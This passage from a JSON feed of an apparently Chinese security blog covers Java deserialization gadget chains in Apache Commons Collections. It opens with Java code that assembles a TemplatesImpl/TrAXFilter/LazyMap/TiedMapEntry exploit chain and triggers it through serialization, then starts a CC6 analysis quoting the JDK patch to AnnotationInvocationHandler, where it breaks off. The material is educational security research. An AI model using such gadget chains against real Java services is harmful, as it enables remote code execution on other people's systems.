bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 对 _tfactory 进行赋值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Field</span> tfactory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transforms <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InstantiateTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>templates<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transforms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">//        chainedTransformer.transform(1);</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> lazyMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token class-name\">TiedMapEntry</span> tiedMapEntry <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        map1<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>tiedMapEntry<span class=\"token punctuation\">,</span><span class=\"token string\">\"bbb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        map<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token class-name\">Class</span> cc <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token class-name\">Field</span> factory <span class=\"token operator\">=</span> cc<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"factory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        factory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        factory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span>chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span>map1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>所谓的 CC 链，都是某种程度上的拼接组合，只要你愿意，你也可以拼接你自己独一无二的利用链</p>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "反序列化"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/21/CC6/",
            "url": "http://zhyzhyzhy.cn/2022/10/21/CC6/",
            "title": "Java反序列化CommonsCollections篇(三)",
            "date_published": "2022-10-20T16:00:00.000Z",
            "content_html": "<h1 id=\"cc6-链条分析\"><a class=\"anchor\" href=\"#cc6-链条分析\">#</a> CC6 链条分析</h1>\n<h2 id=\"cc1的修复\"><a class=\"anchor\" href=\"#cc1的修复\">#</a> CC1 的修复</h2>\n<p>jdk 7u21 后，将不再存在 CC1 的调用链，具体原因如下<br />\n改动对比：<span class=\"exturl\" data-url=\"aHR0cDovL2hnLm9wZW5qZGsuamF2YS5uZXQvamRrOHUvamRrOHUvamRrL3Jldi9mOGE1MjhkMDM3OWQ=\">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</span></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">--</span><span class=\"token operator\">-</span> a<span class=\"token operator\">/</span>src<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>classes<span class=\"token operator\">/</span>sun<span class=\"token operator\">/</span>reflect<span class=\"token operator\">/</span>annotation<span class=\"token operator\">/</span><span class=\"token class-name\">AnnotationInvocationHandler</span><span class=\"token punctuation\">.</span>java\t<span class=\"token class-name\">Tue</span> <span class=\"token class-name\">Dec</span> <span class=\"token number\">01</span> <span class=\"token number\">08</span><span class=\"token operator\">:</span><span class=\"token number\">58</span><span class=\"token operator\">:</span><span class=\"token number\">28</span> <span class=\"token number\">2015</span> <span class=\"token operator\">-</span><span class=\"token number\">0500</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">++</span><span class=\"token operator\">+</span> b<span class=\"token operator\">/</span>src<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>classes<span class=\"token operator\">/</span>sun<span class=\"token operator\">/</span>reflect<span class=\"token operator\">/</span>annotation<span class=\"token operator\">/</span><span class=\"token class-name\">AnnotationInvocationHandler</span><span class=\"token punctuation\">.</span>java\t<span class=\"token class-name\">Tue</span> <span class=\"token class-name\">Dec</span> <span class=\"token number\">01</span> <span class=\"token number\">22</span><span class=\"token operator\">:</span><span class=\"token number\">38</span><span class=\"token operator\">:</span><span class=\"token number\">16</span> <span class=\"token number\">2015</span> <span class=\"token operator\">+</span><span class=\"token number\">0000</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>@@ <span class=\"token operator\">-</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span> @@</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">package</span> <span class=\"token namespace\">sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span>annotation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Serializable</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>@@ <span class=\"token operator\">-</span><span class=\"token number\">425</span><span class=\"token punctuation\">,</span><span class=\"token number\">35</span> <span class=\"token operator\">+</span><span class=\"token number\">426</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span> @@</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>         <span class=\"token keyword\">throws</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">-</span>        s<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token class-name\">ObjectInputStream<span class=\"token punctuation\">.</span>GetField</span> fields <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readFields</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">></span></span> t <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">)</span>fields<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"type\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> streamVals <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">)</span>fields<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"memberValues\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>         <span class=\"token comment\">// Check to make sure that types have not evolved incompatibly</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>         <span class=\"token class-name\">AnnotationType</span> annotationType <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>         <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">-</span>            annotationType <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">+</span>            annotationType <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalArgumentException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>             <span class=\"token comment\">// Class is no longer an annotation type; time to punch out</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>             <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Non-annotation type in annotation serial stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>         <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> memberTypes <span class=\"token operator\">=</span> annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token comment\">// consistent with runtime Map type</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> mv <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedHashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>         <span class=\"token comment\">// If there are annotation members without values, that</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>         <span class=\"token comment\">// situation is handled by the invoke method.</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token operator\">-</span>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValue <span class=\"token operator\">:</span> memberValues<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValue <span class=\"token operator\">:</span> streamVals<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>             <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token operator\">+</span>            <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>             <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> memberType <span class=\"token operator\">=</span> memberTypes<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>memberType <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// i.e. member still exists</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token operator\">-</span>                <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token operator\">+</span>                value <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                 <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>memberType<span class=\"token punctuation\">.</span><span class=\"token function\">isInstance</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                       value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ExceptionProxy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token operator\">-</span>                    memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token operator\">-</span>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token operator\">+</span>                    value <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                             value<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"[\"</span> <span class=\"token operator\">+</span> value <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token operator\">-</span>                                annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token operator\">+</span>                                annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                 <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>             <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token operator\">+</span>            mv<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token class-name\">UnsafeAccessor</span><span class=\"token punctuation\">.</span><span class=\"token function\">setType</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token class-name\">UnsafeAccessor</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMemberValues</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> mv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token operator\">+</span>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token operator\">+</span>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UnsafeAccessor</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\"><span class=\"token namespace\">sun<span class=\"token punctuation\">.</span>misc<span class=\"token punctuation\">.</span></span>Unsafe</span> unsafe<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">long</span> typeOffset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">long</span> memberValuesOffset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">static</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token operator\">+</span>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token operator\">+</span>                unsafe <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token 